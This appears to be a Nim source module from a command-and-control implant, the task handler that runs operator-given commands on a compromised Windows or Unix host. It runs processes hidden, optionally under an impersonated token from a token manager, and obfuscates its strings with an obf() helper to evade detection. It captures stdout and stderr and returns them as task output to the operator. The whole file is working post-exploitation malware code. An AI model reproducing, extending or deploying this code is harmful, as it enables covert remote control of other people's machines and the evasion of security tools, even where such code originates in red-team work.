import json
import ../utils/strenc

when defined(windows):
  import winim/lean
  import token_manager
else:
  import osproc

type
  RunArgs = object
    executable: string
    arguments: string

proc run*(taskId: string, params: JsonNode): JsonNode =
  ## Execute a binary on the target system
  try:
    let args = to(params, RunArgs)
    
    if args.executable.len == 0:
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): "error",
        obf("user_output"): obf("Executable path cannot be empty")
      }
    
    when defined(windows):
      var
        si: STARTUPINFOA
        pi: PROCESS_INFORMATION
        commandLine: string
      
      si.cb = sizeof(STARTUPINFOA).DWORD
      si.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
      si.wShowWindow = SW_HIDE
      
      # Build command line - handle "default" case for shell alias
      if args.executable == obf("default"):
        # When called from shell command, arguments contains the actual command
        commandLine = obf("cmd.exe /c ") & args.arguments
      elif args.arguments.len > 0:
        commandLine = args.executable & " " & args.arguments
      else:
        commandLine = args.executable
      
      # Create pipes for stdout/stderr
      var
        hStdoutRead, hStdoutWrite: HANDLE
        hStderrRead, hStderrWrite: HANDLE
        sa: SECURITY_ATTRIBUTES
      
      sa.nLength = sizeof(SECURITY_ATTRIBUTES).DWORD
      sa.bInheritHandle = TRUE
      sa.lpSecurityDescriptor = nil
      
      if CreatePipe(addr hStdoutRead, addr hStdoutWrite, addr sa, 0) == 0:
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Failed to create stdout pipe")
        }
      
      if CreatePipe(addr hStderrRead, addr hStderrWrite, addr sa, 0) == 0:
        CloseHandle(hStdoutRead)
        CloseHandle(hStdoutWrite)
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Failed to create stderr pipe")
        }
      
      # Make sure read handles are not inherited
      discard SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0)
      discard SetHandleInformation(hStderrRead, HANDLE_FLAG_INHERIT, 0)
      
      si.hStdOutput = hStdoutWrite
      si.hStdError = hStderrWrite
      si.hStdInput = GetStdHandle(STD_INPUT_HANDLE)
      
      # Check if we have an impersonation token
      let tokenHandle = getTokenHandle()
      var createResult: WINBOOL
      
      if tokenHandle != 0:
        # We have an impersonation token - try CreateProcessWithTokenW
        # Convert command line to wide string
        var commandLineW = newWideCString(commandLine)
        
        # Create STARTUPINFOW for the wide-char version
        var siW: STARTUPINFOW
        siW.cb = sizeof(STARTUPINFOW).DWORD
        siW.dwFlags = STARTF_USESTDHANDLES or STARTF_USESHOWWINDOW
        siW.wShowWindow = SW_HIDE
        siW.hStdOutput = hStdoutWrite
        siW.hStdError = hStderrWrite
        siW.hStdInput = GetStdHandle(STD_INPUT_HANDLE)
        
        # Try CreateProcessWithTokenW to run as the impersonated user
        createResult = CreateProcessWithTokenW(
          tokenHandle,
          0,  # LOGON_WITH_PROFILE
          nil,
          cast[LPWSTR](commandLineW[0].addr),
          CREATE_NO_WINDOW,
          nil,
          nil,
          addr siW,
          addr pi
        )
        
        # If it fails with ACCESS_DENIED (error 5), fall back to CreateProcessA
        # CreateProcessWithTokenW requires SE_IMPERSONATE_NAME privilege which regular users don't have
        if createResult == 0 and GetLastError() == 5:
          createResult = CreateProcessA(
            nil,
            addr commandLine[0],
            nil,
            nil,
            TRUE,  # Inherit handles
            CREATE_NO_WINDOW,
            nil,
            nil,
            addr si,
            addr pi
          )
      else:
        # No impersonation token - use normal CreateProcessA
        createResult = CreateProcessA(
          nil,
          addr commandLine[0],
          nil,
          nil,
          TRUE,  # Inherit handles
          CREATE_NO_WINDOW,
          nil,
          nil,
          addr si,
          addr pi
        )
      
      # Close write ends of pipes
      CloseHandle(hStdoutWrite)
      CloseHandle(hStderrWrite)
      
      if createResult == 0:
        let errorCode = GetLastError()
        CloseHandle(hStdoutRead)
        CloseHandle(hStderrRead)
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Failed to create process. Error code: ") & $errorCode
        }
      
      # Read output
      var output = ""
      var buffer: array[4096, char]
      var bytesRead: DWORD
      
      while ReadFile(hStdoutRead, addr buffer[0], 4096, addr bytesRead, nil) != 0 and bytesRead > 0:
        for i in 0..<bytesRead:
          output.add(buffer[i])
      
      # Read stderr
      var errors = ""
      while ReadFile(hStderrRead, addr buffer[0], 4096, addr bytesRead, nil) != 0 and bytesRead > 0:
        for i in 0..<bytesRead:
          errors.add(buffer[i])
      
      # Wait for process to complete
      discard WaitForSingleObject(pi.hProcess, INFINITE)
      
      var exitCode: DWORD
      discard GetExitCodeProcess(pi.hProcess, addr exitCode)
      
      CloseHandle(pi.hProcess)
      CloseHandle(pi.hThread)
      CloseHandle(hStdoutRead)
      CloseHandle(hStderrRead)
      
      var finalOutput = ""
      if output.len > 0:
        finalOutput.add(output)
      if errors.len > 0:
        if finalOutput.len > 0:
          finalOutput.add("\n")
        finalOutput.add(errors)
      
      if finalOutput.len == 0:
        finalOutput = obf("(No output)")
      
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): if exitCode == 0: obf("success") else: "error",
        obf("user_output"): finalOutput
      }
    else:
      # Unix-like systems
      var cmd = args.executable
      if args.arguments.len > 0:
        cmd &= " " & args.arguments
      
      let (output, exitCode) = execCmdEx(cmd)
      
      var finalOutput = obf("Process executed successfully\n")
      finalOutput.add(obf("Command: ") & cmd & "\n")
      finalOutput.add(obf("Exit code: ") & $exitCode & "\n")
      if output.len > 0:
        finalOutput.add(obf("\n=== Output ===\n") & output & obf("\n==============\n"))
      
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): obf("success"),
        obf("user_output"): finalOutput
      }
      
  except Exception as e:
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): obf("Failed to execute process: ") & e.msg
    }
